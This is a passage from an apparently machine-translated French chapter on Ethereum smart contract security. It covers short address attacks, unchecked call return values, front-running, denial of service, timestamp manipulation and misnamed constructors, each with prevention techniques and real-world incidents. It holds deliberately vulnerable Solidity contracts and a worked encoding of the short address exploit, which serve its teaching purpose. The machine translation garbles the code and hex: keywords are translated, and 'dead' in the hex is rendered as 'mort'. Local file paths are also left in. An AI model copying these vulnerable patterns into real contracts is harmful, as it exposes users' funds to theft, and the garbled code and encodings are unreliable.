contrat Private_Bank

\{

mappage (adresse => uint ) des soldes publics ;

uint public MinDeposit = 1 éther ;

Log TransferLog ;

fonction Private_ Bank ( adresse _log)

\{

TransfertLog = Log(_log );

}

fonction Dépôt( )

Publique

payable

\{

if( msg.value >= MinDeposit )

\{

balances[ msg.sender ]+= msg.value ;

TransferLog.AddMessage ( msg.sender ,msg.value,"Deposit ");

}

}

fonction CashOut ( uint _am)

\{

if(_am<=balances[ msg.sender ])

\{

if( msg.sender .call.value (_am)())

\{

balances[ msg.sender ]-=_am ;

TransferLog.AddMessage ( msg.sender ,_am," CashOut ");

}

}

}

fonction( ) payable externe\{}

}

journal des contrats

\{

structure Message

\{

adresse de l' expéditeur ;

chaîne Données ;

uint Val ;

uint Heure ;

}

Message[ ] historique public ;

Message DernierMsg ;

fonction AddMessage ( adresse _ adr,uint _ val,chaîne _data)

Publique

\{

LastMsg.Sender = _ adr ;

LastMsg.Time = maintenant ;

LastMsg.Val = _ val ;

LastMsg.Data = _ données ;

Historique.push ( LastMsg );

}

}

Ce http://bit.ly/2Q58VyX[+++message+++] d'un utilisateur de reddit explique comment il a perdu 1 éther à cause de ce contrat en essayant d'exploiter le bogue de réentrance qu'il s'attendait à trouver dans le contrat.

Attaque par adresse courte/paramètre

Cette attaque n'est pas effectuée sur les contrats Solidity eux-mêmes, mais sur des applications tierces susceptibles d'interagir avec eux. Cette section est ajoutée par souci d'exhaustivité et pour donner au lecteur une idée de la façon dont les paramètres peuvent être manipulés dans les contrats.

Pour en savoir plus, consultez http://bit.ly/2yKme14[+++« The ERC20 Short Address Attack Explained »+++] , http://bit.ly/2yFOGRQ[+++« ICO Smart Contract Vulnerability : Short Address Attack »+++] , ou ce http://bit.ly/2CQjBhc[+++post Reddit+++] .

La vulnérabilité

Lors de la transmission de paramètres à un contrat intelligent, les paramètres sont codés conformément à la http://bit.ly/2Q5VIG9[+++spécification ABI+++] . Il est possible d'envoyer des paramètres codés plus courts que la longueur de paramètre attendue (par exemple, envoyer une adresse qui ne contient que 38 caractères hexadécimaux (19 octets) au lieu des 40 caractères hexadécimaux standard (20 octets)). Dans un tel scénario, l'EVM ajoutera des zéros à la fin des paramètres codés pour compenser la longueur attendue.

Cela devient un problème lorsque les applications tierces ne valident pas les entrées. L'exemple le plus clair est un échange qui ne vérifie pas l'adresse d'un jeton ERC20 lorsqu'un utilisateur demande un retrait. Cet exemple est traité plus en détail dans l'article de Peter Vessenes , http://bit.ly/2Q1ybpQ[+++"The ERC20 Short Address Attack Explained"+++] .

Considérez l'interface de fonction de transfert standard http://bit.ly/2CUf7WG[+++ERC20+++] , en notant l'ordre des paramètres :

transfert de fonction ( adresse à, jetons uint ) retours publics (succès bool);

Considérons maintenant un échange détenant une grande quantité d'un jeton (disons REP ) et un utilisateur qui souhaite retirer sa part de 100 jetons. L'utilisateur soumettrait son adresse, 0xdeaddeaddeaddeaddeaddeaddeaddeaddeaddead , et le nombre de jetons, 100 . Le central coderait ces paramètres dans l'ordre spécifié par la fonction de transfert ; c'est-à-dire adresse puis jetons . Le résultat encodé serait :

a9059cbb00000000000000000000000mortmortdea \

dmortmortmortmortmortmortmort0000000000000

0000000000000000000000000000000056bc75e2d63100000

Les 4 premiers octets ( a9059cbb ) sont le transfert http://bit.ly/2RmueMP[+++function signature/selector+++] , les 32 octets suivants sont l'adresse et les 32 derniers octets représentent le nombre uint256 de jetons. Notez que l'hex 56bc75e2d63100000 à la fin correspond à 100 jetons (avec 18 décimales, comme spécifié par le contrat de jeton REP ).

Voyons maintenant ce qui se passerait si l'on envoyait une adresse à laquelle il manquait 1 octet (2 chiffres hexadécimaux). Plus précisément, disons qu'un attaquant envoie 0xdeaddeaddeaddeaddeaddeaddeaddeadde comme adresse (il manque les deux derniers chiffres) et les mêmes 100 jetons à retirer. Si l'échange ne valide pas cette entrée, elle sera encodée comme :

a9059cbb00000000000000000000000mortmortdea \

dmortmortmortmortmortmortde00000000000000

000000000000000000000000000000056bc75e2d6310000000

La différence est subtile. Notez que 00 a été ajouté à la fin de l'encodage, pour compenser l'adresse courte qui a été envoyée. Lorsque cela est envoyé au contrat intelligent, les paramètres d'adresse seront lus comme 0xdeaddeaddeaddeaddeaddeaddeaddeadde00 et la valeur sera lue comme 56bc75e2d6310000000 (notez les deux 0 supplémentaires). Cette valeur est maintenant de 25600 jetons (la valeur a été multipliée par 256 ). Dans cet exemple, si l'échange contenait autant de jetons, l'utilisateur retirerait 25600 jetons (alors que l'échange pense que l'utilisateur n'en retire que 100 ) à l'adresse modifiée. Évidemment , l'attaquant ne possédera pas l'adresse modifiée dans cet exemple, mais si l'attaquant devait générer une adresse qui se terminait par des 0 (qui peut être facilement forcée brutalement) et utilisait cette adresse générée, il pourrait voler des jetons à l'échange sans méfiance. .

Techniques préventives

Tous les paramètres d'entrée dans les applications externes doivent être validés avant de les envoyer à la blockchain. Il convient également de noter que l'ordre des paramètres joue ici un rôle important. Comme le rembourrage ne se produit qu'à la fin, un ordre minutieux des paramètres dans le contrat intelligent peut atténuer certaines formes de cette attaque.

Valeurs de retour CALL non cochées

Il existe plusieurs façons d'effectuer des appels externes dans Solidity. L'envoi d'ether à des comptes externes est généralement effectué via la méthode de transfert . Cependant, la fonction d' envoi peut également être utilisée, et pour des appels externes plus polyvalents, l' opcode CALL peut être directement utilisé dans Solidity. Les fonctions d'appel et d' envoi renvoient un booléen indiquant si l'appel a réussi ou échoué. Ainsi, ces fonctions ont une simple mise en garde, en ce sens que la transaction qui exécute ces fonctions ne reviendra pas si l'appel externe ( initialisé par call ou send ) échoue ; à la place, les fonctions renverront simplement false . Une erreur courante est que le développeur s'attend à ce qu'un retour se produise si l'appel externe échoue et ne vérifie pas la valeur de retour.

Pour en savoir plus, consultez le numéro 4 du http://www.dasp.co/#item-4[+++Top 10 DASP de 2018+++] et http://bit.ly/2RnS1vA[+++"Scanning Live Ethereum Contracts for the 'Unchecked-Send' Bug"+++] .

La vulnérabilité

Considérez l'exemple suivant :

contrat Loto \{

bool public payedOut = faux ;

adresse public gagnant ;

uint public winAmount ;

// ... fonctionnalité supplémentaire ici

fonction envoyerVersGagnant ( ) public \{

exiger (! payéOut );

gagnant.send ( winAmount );

payéOut = vrai ;

}

fonction retirerLeftOver ( ) public \{

exiger( payedOut );

msg.sender .send ( this.balance );

}

}

Cela représente un contrat de type Lotto, où un gagnant reçoit une quantité d'éther, ce qui laisse généralement un peu de reste à retirer.

La vulnérabilité existe sur la ligne 11, où un envoi est utilisé sans vérifier la réponse. Dans cet exemple trivial, un gagnant dont la transaction échoue (soit parce qu'il est à court d'essence, soit parce qu'il s'agit d'un contrat qui lance intentionnellement la fonction de secours) permet à payedOut d'être défini sur true , que l'éther ait été envoyé ou non. Dans ce cas, n'importe qui peut retirer les gains du gagnant via la fonction retraitLeftOver .

Techniques préventives

Dans la mesure du possible, utilisez la fonction transfer plutôt que send , car le transfert sera annulé si la transaction externe est annulée. Si un envoi est requis, vérifiez toujours la valeur de retour.

http://bit.ly/2CSdF7y[+++recommandation+++] plus robuste est d'adopter un _modèle de retrait_ . Dans cette solution, chaque utilisateur doit appeler une fonction de retrait isolée qui gère l'envoi d'éther hors du contrat et traite les conséquences des transactions d'envoi échouées. L'idée est d'isoler logiquement la fonctionnalité d'envoi externe du reste de la base de code et de placer le fardeau d'une transaction potentiellement échouée sur l'utilisateur final appelant la fonction de retrait.

Exemple concret : Etherpot et King of the Ether

http://bit.ly/2OfHalK[+++Etherpot+++] était une loterie de contrats intelligents, pas trop différente de l'exemple de contrat mentionné précédemment. La chute de ce contrat était principalement due à une utilisation incorrecte des hachages de bloc (seuls les 256 derniers hachages de bloc sont utilisables ; voir le http://bit.ly/2Jpzf4x[+++post d'+++] Aakil Fernandes sur la façon dont Etherpot n'a pas réussi à en tenir compte correctement). Cependant, ce contrat a également souffert d'une valeur d'appel non contrôlée. Considérez la fonction cash dans file:///\\\\wsl.localhost\\Ubuntu-20.04\\home\\syr3fx\\Code\\github\\maitriser-ca\\LivreMaitriserEthereum\\adoc\\for_use_ethereumbook_09smart-contracts-securitytxt_fr_CA.html#lotto_security[+++lotto.sol : extrait de code+++] .

_Exemple 9. loto.sol : Extrait de code_

...

fonction cash( uint indexarrondi , uint subpotIndex )\{

var subpotsCount = getSubpotsCount ( roundIndex );

if( subpotIndex >= subpotsCount )

retourner;

var decisionBlockNumber = getDecisionBlockNumber ( roundIndex,subpotIndex );

if( decisionBlockNumber > block.number )

retourner;

if(arrondis[ roundIndex ]. isCashed [ subpotIndex ])

retourner;

// Les sous- pots ne peuvent être encaissés qu'une seule fois. C'est pour éviter les doubles paiements

var gagnant = calculateWinner ( roundIndex,subpotIndex );

var subpot = getSubpot ( roundIndex );

winner.send ( subpot );

tours[ roundIndex ]. isCashed [ subpotIndex ] = vrai;

// Marquer le tour comme encaissé

}

...

Notez qu'à la ligne 21, la valeur de retour de la fonction d' envoi n'est pas vérifiée, et la ligne suivante définit alors un booléen indiquant que le gagnant a reçu ses fonds. Ce bogue peut autoriser un état où le gagnant ne reçoit pas son ether, mais l'état du contrat peut indiquer que le gagnant a déjà été payé.

Une version plus sérieuse de ce bogue s'est produite dans le http://bit.ly/2ACsfi1[+++King of the Ether+++] . Un excellent http://bit.ly/2ESoaub[+++post-mortem+++] de ce contrat a été écrit qui détaille comment un envoi échoué non contrôlé pourrait être utilisé pour attaquer le contrat.

Conditions de course/course avant

La combinaison d'appels externes à d'autres contrats et la nature multi-utilisateurs de la blockchain sous-jacente donnent lieu à une variété de pièges potentiels de Solidity dans lesquels les utilisateurs font la _course_ à l'exécution du code pour obtenir des états inattendus. La réentrance (discutée plus haut dans ce chapitre) est un exemple d'une telle condition de concurrence. Dans cette section, nous discuterons d'autres types de conditions de concurrence pouvant survenir sur la blockchain Ethereum. Il existe une variété de bons articles sur ce sujet, y compris "Race Conditions" sur le http://bit.ly/2yFesFF[+++Wiki Ethereum+++] , http://www.dasp.co/#item-7[+++#7 sur le DASP Top10 de 2018+++] , et les http://bit.ly/2Q6E4lP[+++meilleures pratiques Ethereum Smart Contract+++] .

La vulnérabilité

Comme avec la plupart des blockchains, les nœuds Ethereum regroupent les transactions et les forment en blocs. Les transactions ne sont considérées comme valides qu'une fois qu'un mineur a résolu un mécanisme de consensus (actuellement http://bit.ly/2yI5Dv7[+++Ethash+++] PoW pour Ethereum). Le mineur qui résout le bloc choisit également les transactions du pool qui seront incluses dans le bloc, généralement classées par le gasPrice de chaque transaction. Voici un vecteur d'attaque potentiel. Un attaquant peut surveiller le pool de transactions à la recherche de transactions susceptibles de contenir des solutions à des problèmes, et modifier ou révoquer les autorisations du solveur ou changer l'état d'un contrat au détriment du solveur. L'attaquant peut alors obtenir les données de cette transaction et créer sa propre transaction avec un gasPrice plus élevé afin que sa transaction soit incluse dans un bloc avant l'original.

Voyons comment cela pourrait fonctionner avec un exemple simple. Considérez le contrat affiché dans file:///\\wsl.localhost\Ubuntu-20.04\home\syr3fx\Code\github\maitriser-ca\LivreMaitriserEthereum\adoc\for_use_ethereumbook_09smart-contracts-securitytxt_fr_CA.html#findthishash_security[+++FindThisHash.sol+++] .

_Exemple 10. FindThisHash.sol_

contrat FindThisHash \{

bytes32 hachage public constant =

0xb5b5b97fafd9855eec9b41f74dfb6c38f5951141f9a3ecd7f44d5479b630ee0a ;

constructor( ) external payable \{} // charger avec de l'éther

fonction résoudre ( solution de chaîne) public \{

// Si vous pouvez trouver la pré-image du hachage, recevez 1000 ether

nécessite( hachage == sha3(solution));

msg.sender .transfer (1000 éther);

}

}

Supposons que ce contrat contienne 1 000 éther . L'utilisateur qui peut trouver la préimage du hachage SHA-3 suivant :

0xb5b5b97fafd9855eec9b41f74dfb6c38f5951141f9a3ecd7f44d5479b630ee0a

peut soumettre la solution et récupérer les 1 000 éthers . Disons qu'un utilisateur découvre que la solution est Ethereum ! . Ils appellent résoudre avec Ethereum ! comme paramètre. Malheureusement, un attaquant a été assez intelligent pour surveiller le pool de transactions pour toute personne soumettant une solution. Ils voient cette solution, vérifient sa validité, puis soumettent une transaction équivalente avec un gasPrice beaucoup plus élevé que la transaction d'origine. Le mineur qui résout le bloc donnera probablement la préférence à l'attaquant en raison du gasPrice plus élevé et exploitera sa transaction avant celle du solveur d'origine. L'attaquant prendra les 1 000 éthers et l'utilisateur qui a résolu le problème n'obtiendra rien. Gardez à l'esprit que dans ce type de vulnérabilité "frontale", les mineurs sont particulièrement incités à exécuter les attaques eux-mêmes (ou peuvent être soudoyés pour exécuter ces attaques avec des frais extravagants). La possibilité que l'attaquant soit lui-même un mineur ne doit pas être sous-estimée.

Techniques préventives

Il existe deux classes d'acteurs qui peuvent effectuer ce type d'attaques frontales : les utilisateurs (qui modifient le prix du gaz de leurs transactions) et les mineurs eux-mêmes (qui peuvent réorganiser les transactions dans un bloc comme ils l'entendent). Un contrat vulnérable à la première classe (utilisateurs) est nettement moins bien loti qu'un contrat vulnérable à la seconde (mineurs), car les mineurs ne peuvent effectuer l'attaque que lorsqu'ils résolvent un bloc, ce qui est peu probable pour un mineur individuel ciblant un bloc spécifique. . Nous énumérerons ici quelques mesures d'atténuation relatives aux deux classes d'attaquants.

Une méthode consiste à placer une limite supérieure sur le gasPrice . Cela empêche les utilisateurs d'augmenter le gasPrice et d'obtenir un ordre de transaction préférentiel au-delà de la limite supérieure. Cette mesure protège uniquement contre la première classe d'attaquants (utilisateurs arbitraires). Les mineurs dans ce scénario peuvent toujours attaquer le contrat, car ils peuvent commander les transactions dans leur bloc comme ils le souhaitent, quel que soit le prix du gaz.

Une méthode plus robuste consiste à utiliser un schéma de http://bit.ly/2CUh2KS[+++validation-révélation .+++] Un tel système dicte que les utilisateurs envoient des transactions avec des informations cachées (généralement un hachage). Une fois la transaction incluse dans un bloc, l'utilisateur envoie une transaction révélant les données qui ont été envoyées (la phase de révélation). Cette méthode empêche les mineurs et les utilisateurs d'exécuter des transactions en amont, car ils ne peuvent pas déterminer le contenu de la transaction. Cette méthode, cependant, ne peut pas dissimuler la valeur de la transaction (qui, dans certains cas, est l'information précieuse qui doit être cachée). Le contrat intelligent https://ens.domains/[+++ENS+++] permettait aux utilisateurs d'envoyer des transactions dont les données engagées comprenaient la quantité d'éther qu'ils étaient prêts à dépenser. Les utilisateurs pourraient alors envoyer des transactions de valeur arbitraire. Au cours de la phase de révélation, les utilisateurs ont été remboursés de la différence entre le montant envoyé lors de la transaction et le montant qu'ils étaient prêts à dépenser.

Une autre suggestion de Lorenz Breidenbach, Phil Daian , Ari Juels et Florian Tramèr est d'utiliser http://bit.ly/2SygqQx[+++des "envois sous-marins"+++] . Une implémentation efficace de cette idée nécessite l' opcode CREATE2 , qui n'a actuellement pas été adopté mais semble susceptible de l'être dans les hard forks à venir.

Exemples concrets : ERC20 et Bancor

La http://bit.ly/2CUf7WG[+++norme ERC20+++] est assez connue pour la construction de jetons sur Ethereum. Cette norme présente une vulnérabilité frontale potentielle due à la fonction d' approbation . http://bit.ly/2DbvQpJ[+++Mikhail+++ +++Vladimirov+++ +++et Dmitry+++ +++Khovratovich+++] ont écrit une bonne explication de cette vulnérabilité (et des moyens d'atténuer l'attaque).

La norme spécifie la fonction d' approbation comme suit :

la fonction approuve ( adresse _spender, uint256 _value) renvoie (bool success)

Cette fonction permet à un utilisateur d'autoriser d'autres utilisateurs à transférer des jetons en son nom. La vulnérabilité frontale se produit dans le scénario où une utilisatrice Alice _autorise_ son ami Bob à dépenser 100 jetons. Alice décide plus tard qu'elle veut révoquer l'autorisation de Bob de dépenser, disons, 100 jetons, alors elle crée une transaction qui fixe l'allocation de Bob à 50 jetons. Bob, qui a observé attentivement la chaîne, voit cette transaction et construit sa propre transaction en dépensant les 100 jetons. Il met un gasPrice plus élevé sur sa transaction que celle d'Alice, donc sa transaction est prioritaire sur la sienne. Certaines implémentations d' approbation permettraient à Bob de transférer ses 100 jetons, puis, lorsque la transaction d'Alice est validée, réinitialiserait l'approbation de Bob à 50 jetons, donnant ainsi à Bob l'accès à 150 jetons.

+++Bancor+++ est un autre exemple important dans le monde réel HYPERLINK "https://www.bancor.network/" . Ivan Bogatyy et son équipe ont documenté une attaque rentable sur la mise en œuvre initiale de Bancor . Son http://bit.ly/2EUlLzb[+++article de blog+++] et http://bit.ly/2yHgkhs[+++sa conférence DevCon3 expliquent+++] en détail comment cela a été fait. Essentiellement, les prix des jetons sont déterminés en fonction de la valeur de la transaction ; les utilisateurs peuvent surveiller le pool de transactions pour les transactions Bancor et les exécuter en amont pour profiter des différences de prix. Cette attaque a été traitée par l' équipe de Bancor .

Déni de service (DoS)

Cette catégorie est très large, mais se compose essentiellement d'attaques où les utilisateurs peuvent rendre un contrat inopérant pendant une période de temps , ou dans certains cas de façon permanente. Cela peut piéger l'éther dans ces contrats pour toujours, comme ce fut le cas dans file:///\\\\wsl.localhost\\Ubuntu-20.04\\home\\syr3fx\\Code\\github\\maitriser-ca\\LivreMaitriserEthereum\\adoc\\for_use_ethereumbook_09smart-contracts-securitytxt_fr_CA.html#multisig_secondhack[+++Real-World Example: Parity+++] file:///\\wsl.localhost\Ubuntu-20.04\home\syr3fx\Code\github\maitriser-ca\LivreMaitriserEthereum\adoc\for_use_ethereumbook_09smart-contracts-securitytxt_fr_CA.html#multisig_secondhack[+++Multisig+++ +++Wallet (Second Hack)+++] .

La vulnérabilité

Un contrat peut devenir inopérant de différentes manières. Ici, nous mettons en évidence quelques modèles de codage Solidity moins évidents qui peuvent conduire à des vulnérabilités DoS :

*Boucle à travers des mappages ou des tableaux manipulés en externe*

____
Ce modèle apparaît généralement lorsqu'un propriétaire souhaite distribuer des jetons aux investisseurs avec une fonction de type distribution , comme dans cet exemple de contrat :

contrat DistributeTokens \{

adresse propriétaire public ; // est défini quelque part

adresse[ ] investisseurs ; // éventail d'investisseurs

uint [ ] jetons de l'investisseur ; // le nombre de jetons que chaque investisseur reçoit

// ... fonctionnalité supplémentaire, y compris transfertoken ( )

fonction investir( ) externe à payer \{

investisseurs.push ( msg.sender );

InvestorTokens.push ( msg.value * 5); // 5 fois le wei envoyé

}

fonction distribuer( ) public \{

require( msg.sender == propriétaire); // seul propriétaire

pour ( uint je = 0 ; i < investisseurs.longueur ; je ++) \{

// ici transferToken ( to,amount ) transfère le "montant" de

// tokens à l'adresse "to"

transferToken (investors[ i ], investorTokens [ i ]);

}

}

}

Notez que la boucle de ce contrat s'exécute sur un tableau qui peut être gonflé artificiellement. Un attaquant peut créer de nombreux comptes d'utilisateurs, ce qui agrandit le tableau des investisseurs . En principe, cela peut être fait de telle sorte que le gaz requis pour exécuter la boucle for dépasse la limite de gaz du bloc, rendant essentiellement la fonction de distribution inopérante.

*Opérations du propriétaire*

Un autre modèle courant est celui où les propriétaires ont des privilèges spécifiques dans les contrats et doivent effectuer certaines tâches pour que le contrat passe à l'état suivant. Un exemple serait un contrat d'offre initiale de pièces (ICO) qui oblige le propriétaire à finaliser le contrat, ce qui permet ensuite aux jetons d'être transférables. Par example:

bool public isFinalized = faux ;

adresse propriétaire public ; // est défini quelque part

fonction finaliser( ) public \{

require( msg.sender == propriétaire);

isFinalized == vrai;

}

// ... fonctionnalité ICO supplémentaire

// fonction de transfert surchargée

fonction transfert( adresse _to, uint _value) renvoie (bool) \{

nécessite( estFinalisé );

super.transfer (_ à,_value )

}

...

Dans de tels cas, si l'utilisateur privilégié perd ses clés privées ou devient inactif, l'ensemble du contrat de jeton devient inopérant. Dans ce cas, si le propriétaire ne peut pas appeler finalize , aucun jeton ne peut être transféré ; l'ensemble du fonctionnement de l'écosystème de jetons repose sur une seule adresse.

*État de progression basé sur les appels externes*

Les contrats sont parfois rédigés de telle sorte que la progression vers un nouvel état nécessite l'envoi d'éther à une adresse ou l'attente d'une entrée d'une source externe. Ces modèles peuvent conduire à des attaques DoS lorsque l'appel externe échoue ou est empêché pour des raisons externes. Dans l'exemple de l'envoi d'ether, un utilisateur peut créer un contrat qui n'accepte pas l'ether. Si un contrat exige que l'éther soit retiré afin de passer à un nouvel état (considérez un contrat à verrouillage temporel qui exige que tout l'éther soit retiré avant d'être à nouveau utilisable), le contrat n'atteindra jamais le nouvel état, car l'éther ne peut jamais être envoyé au contrat de l'utilisateur qui n'accepte pas l'éther.
____

Techniques préventives

Dans le premier exemple, les contrats ne doivent pas boucler sur des structures de données pouvant être artificiellement manipulées par des utilisateurs externes. Un modèle de retrait est recommandé, dans lequel chacun des investisseurs appelle une fonction de retrait pour réclamer des jetons de manière indépendante.

Dans le deuxième exemple, un utilisateur privilégié devait modifier l'état du contrat. Dans de tels exemples, une sécurité intégrée peut être utilisée dans le cas où le propriétaire deviendrait incapable. Une solution consiste à faire du propriétaire un contrat multisig . Une autre solution consiste à utiliser un verrouillage temporel : dans l'exemple donné, le require à la ligne 5 pourrait inclure un mécanisme basé sur le temps, tel que require( msg.sender == owner || now > unlockTime ) , qui permet à tout utilisateur de finaliser après une période de temps spécifiée par unlockTime . Ce type de technique d'atténuation peut également être utilisé dans le troisième exemple. Si les appels externes doivent progresser vers un nouvel état, tenez compte de leur échec possible et ajoutez éventuellement une progression d'état basée sur le temps dans le cas où l'appel souhaité n'arrive jamais.

[width="100%",cols="12%,88%",options="header",]
|===
|*REMARQUE* |Bien sûr, il existe des alternatives centralisées à ces suggestions : on peut ajouter un maintenanceUser qui peut intervenir et résoudre les problèmes avec les vecteurs d'attaque basés sur DoS si besoin est. Généralement , ces types de contrats posent des problèmes de confiance, en raison du pouvoir d'une telle entité.
|===

Exemples concrets : gouvernement

http://governmental.github.io/GovernMental/[+++GovernMental+++] était un ancien schéma de Ponzi qui accumulait une assez grande quantité d'éther (1 100 éther, à un moment donné). Malheureusement, il était sensible aux vulnérabilités DoS mentionnées dans cette section. Un http://bit.ly/2DcgvFc[+++post Reddit+++] par etherik décrit comment le contrat exigeait la suppression d'un grand mappage afin de retirer l'éther. La suppression de cette cartographie avait un coût en gaz qui dépassait la limite de gaz du bloc à l'époque, et il n'était donc pas possible de retirer les 1 100 éthers . The contract address is http://bit.ly/2Oh8j7R[+++0xF45717552f12Ef7cb65e95476F217Ea008167Ae3+++] , and you can see from transaction http://bit.ly/2Ogzrnn[+++0x0d80d67202bd9cb6773df8dd2020e719&thinsp;0a1b0793e8ec4fc105257e8128f0506b+++] that the 1,100 ether were finally obtained with a transaction that used 2.5M gas (when the block gas limit had risen enough to allow such a transaction).

Blocage de la manipulation de l'horodatage

Les horodatages de bloc ont historiquement été utilisés pour une variété d'applications, telles que l'entropie pour les nombres aléatoires (voir l' +++illusion d'entropie+++ pour plus de détails), le verrouillage des fonds pendant des périodes de temps et diverses instructions conditionnelles de changement d'état qui dépendent du temps. Les mineurs ont la possibilité d' ajuster légèrement les horodatages, ce qui peut s'avérer dangereux si les horodatages de bloc sont utilisés de manière incorrecte dans les contrats intelligents.

Les références utiles pour cela incluent http://bit.ly/2OdUC9C[+++les documents Solidity+++] et http://bit.ly/2CQ8gh4[+++la question Ethereum Stack Exchange de Joris Bontje+++] sur le sujet.

La vulnérabilité

block.timestamp et son alias peuvent désormais être manipulés par les mineurs s'ils sont incités à le faire. Construisons un jeu simple, montré dans file:///\\\\wsl.localhost\\Ubuntu-20.04\\home\\syr3fx\\Code\\github\\maitriser-ca\\LivreMaitriserEthereum\\adoc\\for_use_ethereumbook_09smart-contracts-securitytxt_fr_CA.html#roulette_security[+++roulette.sol+++] , qui serait vulnérable à l'exploitation des mineurs.

_Exemple 11. roulette.sol_

contrat Roulette \{

uint public pastBlockTime ; // force un pari par bloc

constructeur( ) external payable \{} // finance initialement le contrat

// fonction de repli utilisée pour faire un pari

fonction () externe payable \{

require( msg.value == 10 ether); // doit envoyer 10 ether pour jouer

require( now != pastBlockTime ); // seulement 1 transaction par bloc

pastBlockTime = maintenant ;

if( now % 15 == 0) \{ // gagnant

msg.sender .transfer ( this.balance );

}

}

}

Ce contrat se comporte comme une simple loterie. Une transaction par bloc peut parier 10 éthers pour avoir une chance de gagner le solde du contrat. L'hypothèse ici est que les deux derniers chiffres de ` block.timestamp sont uniformément distribués. Si tel était le cas, il y aurait 1 chance sur 15 de gagner à cette loterie.

Cependant, comme nous le savons, les mineurs peuvent ajuster l'horodatage s'ils en ont besoin. Dans ce cas particulier, s'il y a suffisamment d'éther dans le contrat, un mineur qui résout un bloc est incité à choisir un horodatage tel que block.timestamp ou maintenant modulo 15 est 0 . Ce faisant, ils peuvent gagner l'éther verrouillé dans ce contrat avec la récompense globale. Comme il n'y a qu'une seule personne autorisée à parier par bloc, cela est également vulnérable aux attaques de front (voir file:///\\wsl.localhost\Ubuntu-20.04\home\syr3fx\Code\github\maitriser-ca\LivreMaitriserEthereum\adoc\for_use_ethereumbook_09smart-contracts-securitytxt_fr_CA.html#frontrunning_security[+++Race Conditions/Front Running+++] pour plus de détails).

En pratique, les horodatages de bloc augmentent de manière monotone et les mineurs ne peuvent donc pas choisir des horodatages de bloc arbitraires (ils doivent être postérieurs à leurs prédécesseurs). Ils sont également limités à définir des heures de bloc pas trop éloignées dans le futur, car ces blocs seront probablement rejetés par le réseau (les nœuds ne valideront pas les blocs dont les horodatages sont dans le futur).

Techniques préventives

Les horodatages de bloc ne doivent pas être utilisés pour l'entropie ou la génération de nombres aléatoires, c'est-à-dire qu'ils ne doivent pas être le facteur décisif (directement ou par dérivation) pour gagner un jeu ou changer un état important.

Une logique sensible au temps est parfois nécessaire ; par exemple, pour débloquer des contrats (time-locking), remplir une ICO après quelques semaines ou faire respecter des dates d'expiration. Il est parfois recommandé d'utiliser http://bit.ly/2OdUC9C[+++block.number+++] et un temps de bloc moyen pour estimer les temps ; avec un temps de bloc de 10 secondes , 1 semaine équivaut à environ 60 480 blocs . Ainsi, spécifier un numéro de bloc auquel changer un état de contrat peut être plus sûr, car les mineurs sont incapables de manipuler facilement le numéro de bloc. Le contrat http://bit.ly/2AAebFr[+++BAT ICO+++] a employé cette stratégie.

Cela peut être inutile si les contrats ne sont pas particulièrement concernés par les manipulations des mineurs de l'horodatage du bloc, mais c'est quelque chose dont il faut être conscient lors de l'élaboration des contrats.

Exemple concret : gouvernemental

http://governmental.github.io/GovernMental/[+++GovernMental+++] , l'ancien schéma de Ponzi mentionné ci-dessus, était également vulnérable à une attaque basée sur l'horodatage. Le contrat est payé au joueur qui a été le dernier joueur à rejoindre (pendant au moins une minute) un tour. Ainsi, un mineur qui était un joueur pouvait ajuster l'horodatage (à une heure future, pour donner l'impression qu'une minute s'était écoulée) pour faire apparaître qu'il était le dernier joueur à rejoindre pendant plus d'une minute (même si ce n'était pas vrai dans la réalité). Plus de détails à ce sujet peuvent être trouvés dans le http://bit.ly/2Q1AMA6[+++post "Historique des vulnérabilités de sécurité d'Ethereum, des piratages et de leurs correctifs"+++] par Tanya Bahrynovska .

Constructeurs avec soin

Les constructeurs sont des fonctions spéciales qui effectuent souvent des tâches critiques et privilégiées lors de l'initialisation des contrats. Avant Solidity v0.4.22, les constructeurs étaient définis comme des fonctions portant le même nom que le contrat qui les contenait. Dans de tels cas, lorsque le nom du contrat est modifié au cours du développement, si le nom du constructeur n'est pas également modifié, il devient une fonction appelable normale. Comme vous pouvez l'imaginer, cela peut conduire (et a conduit) à des hacks de contrats intéressants.

Pour plus d'informations, le lecteur peut être intéressé à tenter les https://github.com/OpenZeppelin/ethernaut[+++défis+++] +++Ethernaut+++ ( en particulier le niveau Fallout).

La vulnérabilité

Si le nom du contrat est modifié, ou s'il y a une faute de frappe dans le nom du constructeur qui ne correspond pas au nom du contrat, le constructeur se comportera comme une fonction normale. Cela peut avoir des conséquences désastreuses, surtout si le constructeur effectue des opérations privilégiées. Considérez le contrat suivant :

contrat OwnerWallet \{

adresse propriétaire public ;

// constructeur

function ownerWallet ( adresse _owner) public \{

propriétaire = _ propriétaire ;

}

// Se retirer. Récupérez de l'éther.

fonction () payable \{}

fonction retirer( ) public \{

require( msg.sender == propriétaire);

msg.sender .transfer ( this.balance );

}

}

Ce contrat collecte de l'éther et permet uniquement au propriétaire de le retirer, en appelant la fonction de retrait . Le problème se pose car le constructeur ne porte pas exactement le même nom que le contrat : la première lettre est différente ! Ainsi, n'importe quel utilisateur peut appeler la fonction ownerWallet , se définir comme propriétaire, puis prendre tout l'éther du contrat en appelant remove .

Techniques préventives

Ce problème a été résolu dans la version 0.4.22 du compilateur Solidity. Cette version a introduit un mot clé de constructeur qui spécifie le constructeur, plutôt que d'exiger que le nom de la fonction corresponde au nom du contrat. L'utilisation de ce mot-clé pour spécifier les constructeurs est recommandée pour éviter les problèmes de nommage.

Exemple concret : Rubixi

http://bit.ly/2ESWG7t[+++Rubixi+++] était un autre système pyramidal qui présentait ce type de vulnérabilité. Il s'appelait à l'origine DynamicPyramid , mais le nom du contrat a été modifié avant le déploiement sur Rubixi . Le nom du constructeur n'a pas été modifié, permettant à n'importe quel utilisateur de devenir le créateur. Des discussions intéressantes liées à ce bogue peuvent être trouvées sur http://bit.ly/2P0TRWw[+++Bitcointalk+++] . En fin de compte, cela a permis aux utilisateurs de se battre pour le statut de créateur afin de réclamer les frais du système pyramidal. Plus de détails sur ce bogue particulier peuvent être trouvés dans http://bit.ly/2Q1AMA6[+++"Historique des vulnérabilités de sécurité d'Ethereum, des piratages et de leurs correctifs"+++] .

Pointeurs de stockage non initialisés

L'EVM stocke les données sous forme de stockage ou de mémoire. Il est fortement recommandé de comprendre exactement comment cela se fait et les types par défaut des variables locales des fonctions lors du développement de contrats. En effet, il est possible de produire des contrats vulnérables en initialisant de manière inappropriée des variables.

